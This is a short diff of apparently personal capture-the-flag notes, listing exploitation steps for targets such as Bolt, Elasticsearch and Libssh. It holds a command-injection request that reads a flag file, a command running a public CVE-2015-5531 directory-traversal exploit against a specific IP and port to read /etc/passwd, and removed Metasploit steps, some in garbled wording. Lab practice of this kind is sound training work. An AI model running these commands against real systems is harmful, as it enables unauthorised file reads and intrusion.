@@ -12,17 +12,11 @@ Bolt
 7. php?cmd=cat /flag.txt
 path traversal vulnerability 
 
-Elastic ?
+Elastic
+1. Searchsploit elasticsearch
+2. 1.6.0 is our vulnerability, https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+3. python exploit.py http://35.198.135.192:32347/ /etc/passwd
 
-1. msfconsole 
-2. search elasticsearch
-3. use 3(an romelsac director traversial uweria
-4. info
-5. set rhost x.x.x.x
-6. set rport yyyy
-7. run
-8. exit
-9. cat grdzeli.txt
 directory traversal 
 
 Libssh
